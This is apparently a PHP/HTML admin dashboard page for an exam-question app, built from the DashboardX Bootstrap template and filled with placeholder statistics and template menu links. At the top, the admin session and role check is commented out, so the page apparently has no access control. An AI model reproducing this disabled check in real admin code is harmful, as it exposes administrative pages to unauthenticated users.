

// if(isset($_SESSION['username'])&&($_SESSION['role'] == 'admin')){

//     include "../koneksi.php";


<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../assets_admin/images/favicon.ico">

    <title>DashboardX Admin - Dashboard</title>
    
	<!-- Bootstrap 4.0-->
	<link rel="stylesheet" href="../assets_admin/vendor_components/bootstrap/dist/css/bootstrap.css">
	
	<!-- theme style -->
	<link rel="stylesheet" href="../assets_admin/css/style.css">
	
	<!-- DashboardX Admin skins -->
	<link rel="stylesheet" href="../assets_admin/css/skin_color.css">

     
  </head>

<body class="hold-transition light-skin sidebar-mini theme-blueindigo onlyheader">
	
<div class="wrapper">
	
  <div class="art-bg">
	  <img src="../assets_admin/images/art1.svg" alt="" class="art-img light-img">
	  <img src="../assets_admin/images/art2.svg" alt="" class="art-img dark-img">
	  <img src="../assets_admin/images/art-bg.svg" alt="" class="wave-img light-img">
	  <img src="../assets_admin/images/art-bg2.svg" alt="" class="wave-img dark-img">
  </div>

  <header class="main-header">
    <!-- Logo -->
    <a href="index.html" class="logo">
      <!-- mini logo -->
	  <div class="logo-mini">
		  <span class="light-logo"><img src="../assets_admin/images/logo-light.png" alt="logo"></span>
		  <span class="dark-logo"><img src="../assets_admin/images/logo-dark.png" alt="logo"></span>
	  </div>
      <!-- logo-->
      <div class="logo-lg">
		  <span class="light-logo"><img src="../assets_admin/images/logo-light-text.png" alt="logo"></span>
	  	  <span class="dark-logo"><img src="../assets_admin/images/logo-dark-text.png" alt="logo"></span>
	  </div>
    </a>
    <!-- Header Navbar -->
    <nav class="navbar navbar-static-top">		
	  <div class="app-menu">
	  </div>
		
      <div class="navbar-custom-menu r-side">
        <ul class="nav navbar-nav">
		   
		  <!-- User Account-->
          <li class="dropdown user user-menu">
            <a href="#" class="waves-effect waves-light dropdown-toggle" data-toggle="dropdown" title="User">
				<i class="ti-user"></i>
            </a>
            <ul class="dropdown-menu animated flipInX">
              <!-- User image -->
              <li class="user-header bg-img" style="background-image: url(../assets_admin/images/user-info.jpg)" data-overlay="3">
				  <div class="flexbox align-self-center">					  
				  	<img src="../assets_admin/images/avatar/7.jpg" class="float-left rounded-circle" alt="User Image">					  
					<h4 class="user-name align-self-center">
					  <span>Samuel Brus</span>
					  <small>samuel@gmail.com</small>
					</h4>
				  </div>
              </li>
              <!-- Menu Body -->
              <li class="user-body">
				    <a class="dropdown-item" href="javascript:void(0)"><i class="ion ion-person"></i> My Profile</a>
					<div class="dropdown-divider"></div>
					<a class="dropdown-item" href="javascript:void(0)"><i class="ion-log-out"></i> Logout</a>
              </li>
            </ul>
          </li>	
			
		  
          <!-- Control Sidebar Toggle Button -->
          <li>
            <a href="#" data-toggle="control-sidebar" title="Setting" class="waves-effect waves-light"><i class="ti-settings"></i></a>
          </li>
			
        </ul>
      </div>
    </nav>
  </header>
  <!-- Content Wrapper. Contains page content -->
  <div class="content-wrapper">
	  <div class="container-full clearfix position-relative">
		<!-- Left side column. contains the logo and sidebar -->
		<aside class="main-sidebar">
			<!-- sidebar-->
			<section class="sidebar">
			  <!-- sidebar menu-->
			  <ul class="sidebar-menu" data-widget="tree">
				<li class="treeview">
				  <a href="index.php">
					<i class="mdi mdi-minus-network"></i>
					<span>Dashboard</span>
				  </a>
				</li>  

				<li class="dropdown">
				  <a href="">
					<i class="mdi mdi-monitor-multiple"></i>
					<span>Soal</span>
				  </a>
				  <ul class="">
					<li><a href="soal.php">soal</a></li>
					<li><a href="mapel.php">mapel</a></li>
					<li><a href="layout_collapsed_sidebar.html">jadwal</a></li>
					<li><a href="bab.php">BAB</a></li>
				  </ul>
				</li>  

				<li>
				  <a href="mailbox.html">
					<i class="mdi mdi-email"></i> <span>Mailbox</span>
				  </a>
				</li>

				<li class="treeview">
				  <a href="#">
					<i class="mdi mdi-comment-account-outline"></i>
					<span>Contact</span>
				  </a>
				  <ul class="treeview-menu">
					<li><a href="contact_app_chat.html">Chat app</a></li>
					<li><a href="contact_app.html">Contact / Employee</a></li>
					<li><a href="contact_userlist_grid.html">Userlist Grid</a></li>
					<li><a href="contact_userlist.html">Userlist</a></li>
				  </ul>
				</li>

				<li class="treeview">
				  <a href="#">
					<i class="mdi mdi-content-duplicate"></i>
					<span>Extra</span>
				  </a>
				  <ul class="treeview-menu">
					<li><a href="extra_app_ticket.html">Support Ticket</a></li>
					<li><a href="extra_calendar.html">Calendar</a></li>
					<li><a href="extra_profile.html">Profile</a></li>
					<li><a href="extra_taskboard.html">Project DashBoard</a></li>
				  </ul>
				</li>


				<li class="treeview">
				  <a href="#">
					<i class="mdi mdi-crop"></i>
					<span>UI Elements</span>
				  </a>
				  <ul class="treeview-menu">
					<li><a href="ui_badges.html">Badges</a></li>
					<li><a href="ui_border_utilities.html">Border</a></li>
					<li><a href="ui_buttons.html">Buttons</a></li>	
					<li><a href="ui_color_utilities.html">Color</a></li>
					<li><a href="ui_dropdown.html">Dropdown</a></li>
					<li><a href="ui_dropdown_grid.html">Dropdown Grid</a></li>
					<li><a href="ui_typography.html">Typography</a></li>
					<li><a href="ui_progress_bars.html">Progress Bars</a></li>
					<li><a href="ui_grid.html">Grid</a></li>
					<li><a href="ui_ribbons.html">Ribbons</a></li>
					<li><a href="ui_sliders.html">Sliders</a></li>
					<li><a href="ui_tab.html">Tabs</a></li>
					<li><a href="ui_timeline.html">Timeline</a></li>
					<li><a href="ui_timeline_horizontal.html">Horizontal Timeline</a></li>
				  </ul>
				</li>  

				<li class="treeview">
				  <a href="#">
					<i class="mdi mdi-ethernet-cable"></i>
					<span>Icons</span>
				  </a>
				  <ul class="treeview-menu">
					<li><a href="icons_fontawesome.html">Font Awesome</a></li>
					<li><a href="icons_glyphicons.html">Glyphicons</a></li>
					<li><a href="icons_material.html">Material Icons</a></li>	
					<li><a href="icons_themify.html">Themify Icons</a></li>
					<li><a href="icons_simpleline.html">Simple Line Icons</a></li>
					<li><a href="icons_cryptocoins.html">Cryptocoins Icons</a></li>
					<li><a href="icons_flag.html">Flag Icons</a></li>
					<li><a href="icons_weather.html">Weather Icons</a></li>
				  </ul>
				</li> 		  

				<li class="treeview">
				  <a href="#">
					<i class="mdi mdi-dice-4"></i>
					<span>Components</span>
				  </a>
				  <ul class="treeview-menu">			
					<li><a href="component_bootstrap_switch.html">Bootstrap Switch</a></li>
					<li><a href="component_date_paginator.html">Date Paginator</a></li>
					<li><a href="component_media_advanced.html">Advanced Medias</a></li>
					<li><a href="component_modals.html">Modals</a></li>
					<li><a href="component_nestable.html">Nestable</a></li>
					<li><a href="component_notification.html">Notification</a></li>
					<li><a href="component_portlet_draggable.html">Draggable Portlets</a></li>
					<li><a href="component_sweatalert.html">Sweet Alert</a></li>
					<li><a href="component_rangeslider.html">Range Slider</a></li>
					<li><a href="component_rating.html">Ratings</a></li>
					<li><a href="component_animations.html">Animations</a></li>
				  </ul>
				</li>		  

				<li class="treeview">
				  <a href="#">
					<i class="mdi mdi-cube-outline"></i>
					<span>Box Cards</span>
				  </a>
				  <ul class="treeview-menu">
					<li><a href="box_cards.html">User Card</a></li>
					<li><a href="box_advanced.html">Advanced Card</a></li>
					<li><a href="box_basic.html">Basic Card</a></li>
					<li><a href="box_color.html">Card Color</a></li>
					<li><a href="box_group.html">Card Group</a></li>
				  </ul>
				</li>		  

				<li class="treeview">
				  <a href="#">
					<i class="mdi mdi-image-filter"></i>
					<span>Widgets</span>
				  </a>
				  <ul class="treeview-menu">
					<li><a href="widgets_blog.html">Blog</a></li>
					<li><a href="widgets_chart.html">Chart</a></li>
					<li><a href="widgets_list.html">List</a></li>
					<li><a href="widgets_social.html">Social</a></li>
					<li><a href="widgets_statistic.html">Statistic</a></li>
					<li><a href="widgets_weather.html">Weather</a></li>
					<li><a href="widgets.html">Widgets</a></li>
				  </ul>
				</li>


				<li class="treeview">
				  <a href="#">
					<i class="mdi mdi-pencil-lock"></i>
					<span>Forms</span>
				  </a>
				  <ul class="treeview-menu">
					<li><a href="forms_advanced.html">Advanced Elements</a></li>
					<li><a href="forms_code_editor.html">Code Editor</a></li>
					<li><a href="forms_editor_markdown.html">Markdown</a></li>
					<li><a href="forms_editors.html">Editors</a></li>
					<li><a href="forms_validation.html">Form Validation</a></li>
					<li><a href="forms_wizard.html">Form Wizard</a></li>
					<li><a href="forms_general.html">General Elements</a></li>
					<li><a href="forms_mask.html">Formatter</a></li>
					<li><a href="forms_xeditable.html">Xeditable Editor</a></li>
					<li><a href="forms_dropzone.html">Dropzone</a></li>
				  </ul>
				</li>

				<li class="treeview">
				  <a href="#">
					<i class="mdi mdi-table-large"></i>
					<span>Tables</span>
				  </a>
				  <ul class="treeview-menu">
					<li><a href="tables_simple.html">Simple tables</a></li>
					<li><a href="tables_data.html">Data tables</a></li>
					<li><a href="tables_editable.html">Editable Tables</a></li>
					<li><a href="tables_color.html">Table Color</a></li>
				  </ul>
				</li>


				<li class="treeview">
				  <a href="#">
					<i class="mdi mdi-poll"></i>
					<span>Charts</span>
				  </a>
				  <ul class="treeview-menu">
					<li><a href="charts_chartjs.html">ChartJS</a></li>
					<li><a href="charts_flot.html">Flot</a></li>
					<li><a href="charts_inline.html">Inline charts</a></li>
					<li><a href="charts_morris.html">Morris</a></li>
					<li><a href="charts_peity.html">Peity</a></li>
					<li><a href="charts_chartist.html">Chartist</a></li>
					<li><a href="charts_c3_axis.html">C3 Axis Chart</a></li>
					<li><a href="charts_c3_bar.html">C3 Bar Chart</a></li>
					<li><a href="charts_c3_data.html">C3 Data Chart</a></li>
					<li><a href="charts_c3_line.html">C3 Line Chart</a></li>
					<li><a href="charts_echarts_basic.html">Basic Echarts</a></li>
					<li><a href="charts_echarts_bar.html">Bar Echarts</a></li>
					<li><a href="charts_echarts_pie_doughnut.html">Pie & Doughnut Echarts</a></li>
				  </ul>
				</li>  


				<li class="treeview">
				  <a href="#">
					<i class="mdi mdi-email-outline"></i>
					<span>Emails</span>
				  </a>
				  <ul class="treeview-menu">
					<li><a href="email_welcome.html">Welcome Email</a></li>
					<li><a href="email_verify_email.html">Verify Emial</a></li>
					<li><a href="email_change_pass.html">Change Password</a></li>
					<li><a href="email_update.html">User Updates</a></li>
					<li><a href="email_expired_card.html">Expired Card</a></li>
					<li><a href="email_closed_account.html">Closed Account</a></li>
				  </ul>
				</li> 

				<li class="treeview">
				  <a href="#">
					<i class="mdi mdi-map"></i>
					<span>Map</span>
				  </a>
				  <ul class="treeview-menu">
					<li><a href="map_google.html">Google Map</a></li>
					<li><a href="map_vector.html">Vector Map</a></li>
				  </ul>
				</li>
				<li class="treeview">
				  <a href="#">
					<i class="mdi mdi-music-note-eighth"></i>
					<span>Extension</span>
				  </a>
				  <ul class="treeview-menu">
					<li><a href="extension_fullscreen.html">Fullscreen</a></li>
					<li><a href="extension_pace.html">Pace</a></li>
				  </ul>
				</li> 


				<li class="treeview">
				  <a href="#">
					<i class="mdi mdi-basket"></i>
					<span>Ecommerce Pages</span>
				  </a>
				  <ul class="treeview-menu">
					<li><a href="ecommerce_products.html">Products</a></li>
					<li><a href="ecommerce_cart.html">Products Cart</a></li>
					<li><a href="ecommerce_products_edit.html">Products Edit</a></li>
					<li><a href="ecommerce_details.html">Product Details</a></li>
					<li><a href="ecommerce_orders.html">Product Orders</a></li>
					<li><a href="ecommerce_checkout.html">Products Checkout</a></li>
				  </ul>
				</li>		  

				<li class="treeview">
				  <a href="#">
					<i class="mdi mdi-brightness-auto"></i>
					<span>Authentication</span>
				  </a>
				  <ul class="treeview-menu">
					<li><a href="auth_login.html">Login</a></li>
					<li><a href="auth_login2.html">Login 2</a></li>
					<li><a href="auth_register.html">Register</a></li>
					<li><a href="auth_register2.html">Register 2</a></li>
					<li><a href="auth_lockscreen.html">Lockscreen</a></li>
					<li><a href="auth_user_pass.html">Recover password</a></li>	
				  </ul>
				</li> 		  

				<li class="treeview">
				  <a href="#">
					<i class="mdi mdi-border-color"></i>
					<span>Invoice</span>
				  </a>
				  <ul class="treeview-menu">
					<li><a href="invoice.html">Invoice</a></li>
					<li><a href="invoicelist.html">Invoice List</a></li>	
				  </ul>
				</li>		  

				<li class="treeview">
				  <a href="#">
					<i class="mdi mdi-alert-outline"></i>
					<span>Error Pages</span>
				  </a>
				  <ul class="treeview-menu">
					<li><a href="error_400.html">Error 400</a></li>
					<li><a href="error_403.html">Error 403</a></li>
					<li><a href="error_404.html">Error 404</a></li>
					<li><a href="error_500.html">Error 500</a></li>
					<li><a href="error_503.html">Error 503</a></li>
					<li><a href="error_maintenance.html">Maintenance</a></li>	
				  </ul>
				</li>   

				<li class="treeview">
				  <a href="#">
					<i class="mdi mdi-cellphone-link"></i>
					<span>Sample Pages</span>
				  </a>
				  <ul class="treeview-menu">
					<li><a href="sample_blank.html">Blank</a></li>
					<li class="treeview"><a href="#">Coming Soon
						</a>
						<ul class="treeview-menu">
							<li><a href="sample_coming_soon_1.html">Coming Soon 1</a></li>
							<li><a href="sample_coming_soon_2.html">Coming Soon 2</a></li>
							<li><a href="sample_coming_soon_3.html">Coming Soon 3</a></li>
						</ul>					  
					</li>
					<li><a href="sample_custom_scroll.html">Custom Scrolls</a></li>
					<li><a href="sample_faq.html">FAQ</a></li>
					<li><a href="sample_gallery.html">Gallery</a></li>
					<li><a href="sample_lightbox.html">Lightbox Popup</a></li>
					<li><a href="sample_pricing.html">Pricing</a></li>
				  </ul>
				</li>
		  

				<li class="treeview">
				  <a href="#">
					<i class="mdi mdi-chart-timeline"></i>
					<span>Multilevel</span>
				  </a>
				  <ul class="treeview-menu">
					<li><a href="#">Level One</a></li>
					<li class="treeview">
					  <a href="#">Level One
						<span class="pull-right-container">
						  <i class="fa fa-angle-right pull-right"></i>
						</span>
					  </a>
					  <ul class="treeview-menu">
						<li><a href="#">Level Two</a></li>
						<li class="treeview">
						  <a href="#">Level Two
							<span class="pull-right-container">
							  <i class="fa fa-angle-right pull-right"></i>
							</span>
						  </a>
						  <ul class="treeview-menu">
							<li><a href="#">Level Three</a></li>
							<li><a href="#">Level Three</a></li>
						  </ul>
						</li>
					  </ul>
					</li>
					<li><a href="#">Level One</a></li>
				  </ul>
				</li>  

				<li>
				  <a href="auth_login.html">
					<i class="ti-power-off"></i>
					<span>Log Out</span>
				  </a>
				</li> 

			  </ul>
			</section>
		</aside>
		<!-- Main content -->
		<section class="content">

			<!-- Content Header (Page header) -->	  
			<div class="content-header">
				<div class="d-flex align-items-center justify-content-between">
					<div class="d-block">
						<h3 class="page-title br-0">Dashboard</h3>
					</div>
					<div class="right-title d-md-block d-none">
                        <div class="d-flex justify-content-end">
							<div class="d-md-flex mr-20 ml-10 d-none">
								<div class="chart-text mr-10">
									<h6 class="mb-0"><small>THIS MONTH</small></h6>
									<h4 class="mt-0 text-primary">$12,125</h4>
								</div>
								<div class="spark-chart">
									<div id="thismonth"><canvas width="60" height="35" style="display: inline-block; width: 60px; height: 35px; vertical-align: top;"></canvas></div>
								</div>
							</div>
							<div class="d-md-flex ml-10 d-none">
								<div class="chart-text mr-10">
									<h6 class="mb-0"><small>LAST YEAR</small></h6>
									<h4 class="mt-0 text-danger">$22,754</h4>
								</div>
								<div class="spark-chart">
									<div id="lastyear"><canvas width="60" height="35" style="display: inline-block; width: 60px; height: 35px; vertical-align: top;"></canvas></div>
								</div>
							</div>
						</div>
                    </div>
				</div>
			</div>

			<div class="row">
				<div class="col-xl-3 col-md-6 col-12">
					<div class="box">
					  <div class="box-body text-center">
						  <i class="ti-wallet font-size-30"></i>
						  <h2 class="font-weight-200">$2 748,74</h2>
						  <h3 class="text-danger font-weight-700">All Income</h3>
						  <p><small>Well, the way they make shows.</small></p>
					  </div>
					  <div class="box-body bg-lightest">
						  <p class="mb-0">This is standard panel footer</p>
					  </div>
					</div>
				</div>
				<div class="col-xl-3 col-md-6 col-12">
					<div class="box">
					  <div class="box-body">
						  <div class="d-flex justify-content-between">
						  	  <div>
								<p class="mb-0">USERS ACTIVITY</p>
						  		<h2 class="font-weight-200 mt-0">748</h2>
							  </div>
						  	  <div>
								<i class="ti-share font-size-40"></i>
							  </div>
						  </div>
						  <p class="font-weight-600 mb-2">Social users</p>
						  <div class="progress progress-xxs mb-10">
							<div class="progress-bar progress-bar-danger progress-bar-striped" role="progressbar" aria-valuenow="40" aria-valuemin="0" aria-valuemax="100" style="width: 40%">
							  <span class="sr-only">40% Complete (success)</span>
							</div>
						  </div>
						  <div class="row">
							<div class="col-6">
								<small>Pages / Visit</small>
								<h4 class="mb-0">7.80</h4>
							</div>

							<div class="col-6">
								<small>% New Visits</small>
								<h4 class="mb-0">76.43%</h4>
							</div>
						 </div>
					  </div>
					  <div class="box-body bg-lightest">
						  <p class="mb-0">This is standard panel footer</p>
					  </div>
					</div>
				</div>
				<div class="col-xl-3 col-md-6 col-12">
					<div class="box">
					  <div class="box-body">
						  <div class="d-flex justify-content-between">
						  	  <div>
								<p class="mb-0">PAGE VIEWS</p>
						  		<h2 class="text-danger font-weight-200">458k+</h2>
							  </div>
						  	  <div>
								<i class="ti-desktop font-size-40"></i>
							  </div>
						  </div>
						  <p class="font-weight-600 mb-2">Social users</p>
						  <p style="padding-bottom: 3px;"><small>Lorem Ipsum is simply dummy text of the printing and typesetting industry.</small></p>
					  </div>
					  <div class="box-body bg-lightest">
						  <p class="mb-0">This is standard panel footer</p>
					  </div>
					</div>
				</div>
				<div class="col-xl-3 col-md-6 col-12">
					<div class="box">
					  <div class="box-body">
						  <div class="d-flex justify-content-between">
						  	  <div>
								<p class="mb-0">TODAY INCOME</p>
								  
							  </div>
						  	  <div>
								<i class="ti-server font-size-40"></i>
							  </div>
						  </div>
						  <div id="linearea" class="mb-5">1,3,5,4,6,8,7,9,7,8,10,16,14,10</div>
						  <div class="row">
							<div class="col-6">
								<small>Today</small>
								<h4 class="mb-0">$458,00</h4>
							</div>

							<div class="col-6">
								<small>Last week</small>
								<h4 class="mb-0">$1485 <i class="ti-arrow-up text-danger"></i> </h4>
							</div>
						 </div>
					  </div>
					  <div class="box-body bg-lightest">
						  <p class="mb-0">This is standard panel footer</p>
					  </div>
					</div>
				</div>
				
				<div class="col-xl-7 col-12">
				  <div class="box">
					<div class="box-header with-border">
					  <h4 class="box-title">By Users</h4>
					</div>
					<!-- /.box-header -->
					<div class="box-body py-0">
						<div class="table-responsive">
						  <table class="table">
							<tbody>
								<tr>
									<td><i class="fa fa-chrome mr-2 text-danger font-size-16"></i>Chrome</td>
									<td>5126<small class="text-muted">(59%)</small></td>
									<td>55.55%</td><td>458<small class="text-muted">(84%)</small></td>
								</tr>								
								<tr>
									<td><i class="fa fa-firefox mr-2 text-blue font-size-16"></i>Firefox</td>
									<td>1124<small class="text-muted">(36%)</small></td>
									<td>21.77%</td><td>189<small class="text-muted">(45%)</small></td>
								</tr>
								<tr>
									<td><i class="fa fa-internet-explorer mr-2 text-warning font-size-16"></i>Internet-Explorer</td>
									<td>2015<small class="text-muted">(28%)</small></td><td>31.87%</td>
									<td>875<small class="text-muted">(82%)</small></td>
								</tr>
								<tr>
									<td><i class="fa fa-opera mr-2 text-danger font-size-16"></i>Opera</td>
									<td>1842<small class="text-muted">(29%)</small></td><td>34.55%</td>
									<td>428<small class="text-muted">(58%)</small></td>
								</tr>
								<tr>
									<td><i class="fa fa-safari mr-2 text-info font-size-16"></i>Safari</td>
									<td>3512<small class="text-muted">(37%)</small></td>
									<td>41%</td><td>399<small class="text-muted">(94%)</small></td>
								</tr>
							  </tbody>
						  </table>
						</div>
					</div>
					<!-- /.box-body -->
				  </div>
				</div>
				<div class="col-xl-5 col-12">
					<div class="box">					
						<div class="box-body">
							<div class="d-flex align-items-center justify-content-between">
								<div>
									<h1 class="mb-0 mt-5">7,485</h1>
									<p>Ext. Records</p>                                
								</div>
								<div>
									<div id="barchart4"></div>
								</div>
							</div>
							<div class="table-responsive">
								<table class="table table-hover mb-0">
									<tbody>
										<tr>
											<th><i class="mdi mdi-circle text-success"></i></th>
											<td><i class="fa fa-facebook-square text-facebook font-size-16"></i></td>
											<td><span>548</span></td>
											<td>55% <i class="mdi mdi-arrow-up"></i></td>
										</tr>
										<tr>
											<th><i class="mdi mdi-circle text-info"></i></th>
											<td><i class="fa fa-twitter-square text-twitter font-size-16"></i></td>
											<td><span>845</span></td>
											<td>25% <i class="mdi mdi-arrow-up"></i></td>
										</tr>
										<tr>
											<th><i class="mdi mdi-circle text-warning"></i></th>
											<td><i class="fa fa-instagram text-instagram font-size-16"></i></td>
											<td><span>425</span></td>
											<td>18% <i class="mdi mdi-arrow-down"></i></td>
										</tr>
										<tr>
											<th><i class="mdi mdi-circle"></i></th>
											<td><i class="fa fa-pinterest-square text-pinterest font-size-16"></i></td>
											<td><span>412</span></td>
											<td>15% <i class="mdi mdi-arrow-down"></i></td>
										</tr>
									</tbody>
								</table>
							</div>
						</div>
					</div>
				</div>
				
				<div class="col-12">
					<div class="box">
						<div class="box-header with-border">
							<h4 class="box-title">Summary</h4>
							<div class="box-controls pull-right">
								<select class="custom-select">
									<option value="0" selected="">Monthly</option>
									<option value="1">Daily</option>
									<option value="2">Weekly</option>
									<option value="3">Yearly</option>
								</select>
							</div>
						</div>

						<div class="box-body">
							<div class="row">
								<div class="col-lg-9">
									<div id="dayreport"></div>
								</div>
								<div class="col-lg-3">
									<h1 class="mb-0 mt-4">$7,745.6</h1>
									<h6 class="font-light text-muted">This Month Earnings</h6>
									<h3 class="mt-4 mb-0">4,421</h3>
									<h6 class="font-light text-muted">This Month Sales</h6>
									<a class="waves-effect waves-light btn btn-info my-3" href="javascript:void(0)">Previous Month Summary</a>
								</div>
							</div>
						</div>
						<div class="box-footer">
							<div class="row mb-0">
								<div class="col-xl-3 col-md-6">
									<div class="d-flex align-items-center">
										<div class="mr-2"><span class="text-primary font-size-60"><i class="mdi mdi-wallet"></i></span></div>
										<div><span>Account Balance</span>
											<h3 class="my-0">$12,8547.53</h3>
										</div>
									</div>
								</div>
								<div class="col-xl-3 col-md-6">
									<div class="d-flex align-items-center">
										<div class="mr-2"><span class="text-success font-size-60"><i class="mdi mdi-star-circle"></i></span></div>
										<div><span>Referral Program</span>
											<h3 class="my-0">$7458.08</h3>
										</div>
									</div>
								</div>
								<div class="col-xl-3 col-md-6">
									<div class="d-flex align-items-center">
										<div class="mr-2"><span class="text-info font-size-60"><i class="mdi mdi-shopping"></i></span></div>
										<div><span>Total Sales</span>
											<h3 class="my-0">7854</h3></div>
									</div>
								</div>
								<div class="col-xl-3 col-md-6">
									<div class="d-flex align-items-center">
										<div class="mr-2"><span class="text-danger font-size-60"><i class="mdi mdi-currency-usd"></i></span></div>
										<div><span>Sales Earnings</span>
											<h3 class="my-0">$12,985.90</h3>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
				
				<div class="col-xl-6 col-12">
					<div class="box mb-lg-0">
						<div class="box-header with-border">
							<h4 class="box-title">Finance Stats</h4>
						</div>
						<div class="box-body p-0 pb-5">
						  <div class="media-list bb-1 bb-dashed border-light">
							<div class="media align-items-center">
							  <div class="media-body">
								<p class="font-size-16">
								  <a class="hover-primary" href="#"><strong>Payment</strong></a>
								</p>
								  <span class="font-size-12">Mauris dignissim lectus ut ipsum</span>
							  </div>
							  <div class="media-right">
								<span class="font-weight-500 font-size-16 text-primary">+118%</span>
							  </div>
							</div>							  
						  </div>
						  <div class="media-list bb-1 bb-dashed border-light">
							<div class="media align-items-center">
							  <div class="media-body">
								<p class="font-size-16">
								  <a class="hover-primary" href="#"><strong>Logistics</strong></a>
								</p>
								  <span class="font-size-12">Proin sit amet nibh ultricies, sagittis ipsum non</span>
							  </div>
							  <div class="media-right">
								<span class="font-weight-500 font-size-16 text-info">$74,123</span>
							  </div>
							</div>							  
						  </div>
						  <div class="media-list bb-1 bb-dashed border-light">
							<div class="media align-items-center">
							  <div class="media-body">
								<p class="font-size-16">
								  <a class="hover-primary" href="#"><strong>Marginal Sale</strong></a>
								</p>
								  <span class="font-size-12">Morbi egestas augue et hendrerit ultrices</span>
							  </div>
							  <div class="media-right">
								<span class="font-weight-500 font-size-16 text-info">+895%</span>
							  </div>
							</div>							  
						  </div>
						  <div class="media-list bb-1 bb-dashed border-light">
							<div class="media align-items-center">
							  <div class="media-body">
								<p class="font-size-16">
								  <a class="hover-primary" href="#"><strong>Expenses</strong></a>
								</p>
								  <span class="font-size-12">Donec vel justo efficitur, lobortis velit </span>
							  </div>
							  <div class="media-right">
								<span class="font-weight-500 font-size-16 text-danger">-12%</span>
							  </div>
							</div>							  
						  </div>
						  <div class="media-list bb-1 bb-dashed border-light">
							<div class="media align-items-center">
							  <div class="media-body">
								<p class="font-size-16">
								  <a class="hover-primary" href="#"><strong>Transactions</strong></a>
								</p>
								  <span class="font-size-12">Aenean gravida erat scelerisque, maximus </span>
							  </div>
							  <div class="media-right">
								<span class="font-weight-500 font-size-16 text-primary">$12,525</span>
							  </div>
							</div>							  
						  </div>
						  <div class="media-list">
							<div class="media align-items-center">
							  <div class="media-body">
								<p class="font-size-16">
								  <a class="hover-primary" href="#"><strong>Lorem ipsum</strong></a>
								</p>
								  <span class="font-size-12">Curabitur eu tellus in ligula condimentum</span>
							  </div>
							  <div class="media-right">
								<span class="font-weight-500 font-size-16 text-success">+21%</span>
							  </div>
							</div>							  
						  </div>
						</div>
					</div>
				</div>
				<div class="col-xl-6 col-12">					
					<div class="box">
						<div class="box-body">
							<div id="chartdiv1" class="w-p100 h-200"></div>
							<h4 class="text-center mb-15">Traffic Source</h4>
							<p class="text-center text-fade">65 (Mid level)</p>
						</div>
					</div>
					<div class="box mb-0">
						<div class="box-body bg-img py-70" style="background-image: url(../images/gallery/thumb/12.jpg)" data-overlay="5">
							<blockquote class="blockquote blockquote-inverse no-border no-margin">
							  <p class="font-size-22">Donec vitae leo dignissim, sodales purus et, egestas est.</p>
							  <footer>Someone famous in <cite title="Source Title">Source Title</cite></footer>
							</blockquote>
						</div>
						<div class="box-body">
							<h4>volutpat metus commodo.</h4>
							<div class="flexbox">
								<div class="time">Few seconds ago</div>
								<ul class="flexbox">
									<li><a href="#">845 <i class="fa fa-comment-o"></i></a></li>
									<li><a href="#">85K <i class="fa fa-heart-o"></i></a></li>
								</ul>
							</div>
						</div>
					  </div>
				</div>
			  </div>			
		</section>
		<!-- /.content -->
	  </div>
  </div>
  <!-- /.content-wrapper -->
  <footer class="main-footer">
    <div class="pull-right d-none d-sm-inline-block">
        <ul class="nav nav-primary nav-dotted nav-dot-separated justify-content-center justify-content-md-end">
		  <li class="nav-item">
			<a class="nav-link" href="javascript:void(0)">FAQ</a>
		  </li>
		  <li class="nav-item">
			<a class="nav-link" href="https://themeforest.net/item/dashboardx-bootstrap-4-admin-template/24987220">Purchase Now</a>
		  </li>
		</ul>
    </div>
	  &copy; 2019 <a href="https://www.multipurposethemes.com/">Multi-Purpose Themes</a>. All Rights Reserved.
  </footer>

  <!-- Control Sidebar -->
  <aside class="control-sidebar">
	  
	<div class="rpanel-title"><span class="waves-effect waves-light pull-right btn btn-circle btn-danger"><i class="ion ion-close text-white" data-toggle="control-sidebar"></i></span> </div>  <!-- Create the tabs -->
    <ul class="nav nav-tabs control-sidebar-tabs">
      <li class="nav-item"><a href="#control-sidebar-home-tab" data-toggle="tab" title="Notifications"><i class="ti-comment-alt"></i></a></li>
      <li class="nav-item"><a href="#control-sidebar-settings-tab" data-toggle="tab" title="Comments"><i class="ti-tag"></i></a></li>
    </ul>
    <!-- Tab panes -->
    <div class="tab-content">
      <!-- Home tab content -->
      <div class="tab-pane" id="control-sidebar-home-tab">
		  <div class="lookup lookup-sm lookup-right d-none d-lg-block mb-20">
			<input type="text" name="s" placeholder="Search" class="w-p100">
		  </div>
          <div class="media-list media-list-hover">
			<a class="media media-single" href="#">
			  <h4 class="w-50 text-gray font-weight-500">10:10</h4>
			  <div class="media-body pl-15 bl-5 rounded border-primary">
				<p>Morbi quis ex eu arcu auctor sagittis.</p>
				<span class="text-fade">by Johne</span>
			  </div>
			</a>

			<a class="media media-single" href="#">
			  <h4 class="w-50 text-gray font-weight-500">08:40</h4>
			  <div class="media-body pl-15 bl-5 rounded border-success">
				<p>Proin iaculis eros non odio ornare efficitur.</p>
				<span class="text-fade">by Amla</span>
			  </div>
			</a>

			<a class="media media-single" href="#">
			  <h4 class="w-50 text-gray font-weight-500">07:10</h4>
			  <div class="media-body pl-15 bl-5 rounded border-info">
				<p>In mattis mi ut posuere consectetur.</p>
				<span class="text-fade">by Josef</span>
			  </div>
			</a>

			<a class="media media-single" href="#">
			  <h4 class="w-50 text-gray font-weight-500">01:15</h4>
			  <div class="media-body pl-15 bl-5 rounded border-danger">
				<p>Morbi quis ex eu arcu auctor sagittis.</p>
				<span class="text-fade">by Rima</span>
			  </div>
			</a>

			<a class="media media-single" href="#">
			  <h4 class="w-50 text-gray font-weight-500">23:12</h4>
			  <div class="media-body pl-15 bl-5 rounded border-warning">
				<p>Morbi quis ex eu arcu auctor sagittis.</p>
				<span class="text-fade">by Alaxa</span>
			  </div>
			</a>

		  </div>
      </div>
      <!-- /.tab-pane -->
      <!-- Settings tab content -->
      <div class="tab-pane" id="control-sidebar-settings-tab">
		  <div class="media-list media-list-hover media-list-divided">
			<div class="media">
			  <img class="avatar avatar-lg" src="../images/avatar/1.jpg" alt="...">

			  <div class="media-body">
				<p><strong>Carter</strong> <span class="float-right">33 min ago</span></p>
				<p>Cras tempor diam nec metus...</p>
				<div class="media-block-actions">
				  <nav class="nav nav-dot-separated no-gutters">
					<div class="nav-item">
					  <a class="nav-link text-success" href="#"><i class="fa fa-thumbs-up"></i> (17)</a>
					</div>
